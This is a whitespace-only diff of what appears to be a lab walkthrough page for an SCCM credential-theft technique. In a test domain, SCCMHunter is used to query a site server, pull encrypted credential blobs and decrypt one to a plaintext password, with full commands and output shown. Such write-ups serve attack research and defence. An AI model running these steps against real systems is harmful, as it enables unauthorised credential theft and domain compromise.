@@ -34,15 +34,15 @@ First, we must use SCCMHunter's `admin` module to enter simulated shell access t
 ┌──(impacket)─(kali㉿SCCM1-kali)-[~/sccmhunter]
 └─$ python3 sccmhunter.py admin -u 'ludus\domainadmin' -p 'password' -ip 10.2.10.15
 SCCMHunter v1.0.9 by @unsigned_sh0rt
-[16:21:04] INFO     [!] Enter help for extra shell commands                                                                                                                                                                                            
-() C:\ >> 
+[16:21:04] INFO     [!] Enter help for extra shell commands
+() C:\ >>
 
 ```
 
 Next, we must obtain the site server's device ID (`ResourceId`) using `get_device <site server>`. Note: You must use only the hostname, not FQDN.
 ```
 () C:\ >> get_device sccm-sitesrv
-[16:24:04] INFO     ------------------------------------------                                                                                                                                         
+[16:24:04] INFO     ------------------------------------------
                     Active: 1
                     Client: 1
                     DistinguishedName: CN=SCCM-SITESRV,OU=Servers,DC=ludus, DC=domain
@@ -58,19 +58,19 @@ Next, we must obtain the site server's device ID (`ResourceId`) using `get_devic
                     SID: S-1-5-21-1740373489-3502891397-2242058250-1108
                     SMSInstalledSites: 123
                     SMSUniqueIdentifier: GUID:C798EE32-DFD0-4A21-BF95-2606755C0FE8
-                    ------------------------------------------   
+                    ------------------------------------------
 ```
 
 Now we can interact with the site server using `interact 16777223`:
 ```
 () (C:\) >> interact 16777223
-(16777223) (C:\) >> 
+(16777223) (C:\) >>
 ```
 
 Next, we can run `get_creds` to query the credential blobs described above:
 ```
 (16777223) (C:\) >> get_creds
-[16:33:55] INFO     Tasked SCCM to extract all encrypted credential blobs                                                                                                                                                                              
+[16:33:55] INFO     Tasked SCCM to extract all encrypted credential blobs
 {
     "@odata.context": "https://sccm-sitesrv.ludus.domain/AdminService/wmi/$metadata#SMS_SCI_Reserved",
     "value": [
@@ -103,12 +103,12 @@ Finally, we run the `decrypt <blob>` (no quotes) command to decrypt the blobs fr
 
 ```
 (16777223) (C:\) >> decrypt 0C0100000B000000010200000366000000A40000081584A380F7995B0D32B802F64F4AFFA90ED6A55AC90B4709097708BF335FAA0330349FAED187B80221F596B847B1E9B4100E2616E8CE32E0DA95B4538DF2805036C700037BFCEA1C4CE4F6A61068491D2CB0BD09A50F908C7D2A7EE6C4319BC885A93431900A8DDF9CFC65CAF03F130A776E5C2ABAC5CCFB20018B78FA86433F3F7D2823AFB326491E1FA0D1C30E9E456E37532AE3FA16D8CED6A59D3C2FDC8DFE1FF951BC83761812997E1313A7873D0184D6B810159E54B108F9E0D60095FF29588C0F64FB122C244F307F614E0E2763A7CFDD84852F18090CC97F36233D46CC9485BE65DC32F6FD4794891315AED9321697F369F967CBFFC1CCE4E0CE25574758D15BD756B657C48C2D3A20172D
-[16:37:59] INFO     Tasked SCCM to decrypt credential blob                                                                                                                                                                                             
-[16:37:59] INFO     [+] Updates script created successfully with GUID 98b0ac33-6742-4422-8751-eb13cf8d37fd.                                                                                                                                            
-[16:38:00] INFO     [+] Script with guid 98b0ac33-6742-4422-8751-eb13cf8d37fd approved.                                                                                                                                                                
-[16:38:00] INFO     [+] Script with guid 98b0ac33-6742-4422-8751-eb13cf8d37fd executed.                                                                                                                                                                
-[16:38:15] INFO     [+] Got result:                                                                                                                                                                                                                    
-[16:38:15] INFO     Password123                                                                                                                                                                                                                        
+[16:37:59] INFO     Tasked SCCM to decrypt credential blob
+[16:37:59] INFO     [+] Updates script created successfully with GUID 98b0ac33-6742-4422-8751-eb13cf8d37fd.
+[16:38:00] INFO     [+] Script with guid 98b0ac33-6742-4422-8751-eb13cf8d37fd approved.
+[16:38:00] INFO     [+] Script with guid 98b0ac33-6742-4422-8751-eb13cf8d37fd executed.
+[16:38:15] INFO     [+] Got result:
+[16:38:15] INFO     Password123
 [16:38:15] INFO     [+] Script with GUID 98b0ac33-6742-4422-8751-eb13cf8d37fd deleted.
 ```
 
